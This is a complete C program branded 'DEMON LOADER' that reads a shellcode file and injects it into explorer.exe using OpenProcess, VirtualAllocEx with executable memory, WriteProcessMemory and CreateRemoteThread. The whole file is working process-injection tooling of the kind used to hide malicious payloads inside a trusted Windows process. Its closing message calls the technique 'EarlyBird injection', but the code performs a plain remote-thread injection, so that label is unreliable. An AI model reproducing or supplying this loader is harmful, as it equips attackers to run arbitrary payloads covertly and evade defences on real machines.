#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

void DisplayBanner() {
    printf("\n");
    printf("-----DEMON LOADER-----\n");
    printf("BY CHRIS H");
    printf("\n");
}


// Function to find the PID of explorer.exe
DWORD FindExplorerPID() {
    DWORD explorerPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Failed to create process snapshot.\n");
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                explorerPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return explorerPID;
}

// Function to read shellcode from a file
unsigned char* ReadShellcode(const char* filePath, size_t* outSize) {
    FILE* file;
    if (fopen_s(&file, filePath, "rb") != 0) {
        printf("[ERROR] Failed to open shellcode file: %s\n", filePath);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    size_t fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        printf("[ERROR] Failed to allocate memory for shellcode.\n");
        fclose(file);
        return NULL;
    }

    fread(buffer, 1, fileSize, file);
    fclose(file);

    *outSize = fileSize;
    return buffer;
}

int main(int argc, char* argv[]) {
    DisplayBanner();
    if (argc != 2) {
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    // Read the shellcode from the provided file
    size_t shellcodeSize = 0;
    unsigned char* shellcode = ReadShellcode(argv[1], &shellcodeSize);
    if (!shellcode) {
        return 1;
    }

    printf("[DEBUG] Shellcode read successfully (%zu bytes).\n", shellcodeSize);

    // Find the PID of explorer.exe
    DWORD explorerPID = FindExplorerPID();
    if (explorerPID == 0) {
        printf("[ERROR] Failed to find explorer.exe process.\n");
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] explorer.exe PID: %d\n", explorerPID);

    // Open the target process (explorer.exe)
    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
    if (!hTargetProcess) {
        printf("[ERROR] OpenProcess failed: %d\n", GetLastError());
        free(shellcode);
        return 1;
    }

    // Allocate memory for the shellcode in the target process
    LPVOID remoteShellcode = VirtualAllocEx(hTargetProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        printf("[ERROR] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hTargetProcess);
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] Allocated memory in target process.\n");

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(hTargetProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        printf("[ERROR] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hTargetProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hTargetProcess);
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] Shellcode written to allocated memory.\n");

    // Create a suspended thread in the target process
    HANDLE hThread = CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteShellcode, NULL, CREATE_SUSPENDED, NULL);
    if (!hThread) {
        printf("[ERROR] CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hTargetProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hTargetProcess);
        free(shellcode);
        return 1;
    }

    printf("[DEBUG] Suspended thread created in target process.\n");

    // Resume the thread to execute the shellcode
    ResumeThread(hThread);
    printf("[DEBUG] Resumed the thread. Shellcode execution started.\n");

    // Clean up
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hTargetProcess, remoteShellcode, 0, MEM_RELEASE);
    CloseHandle(hTargetProcess);
    free(shellcode);

    printf("[INFO] EarlyBird injection completed successfully.\n");
    return 0;
}
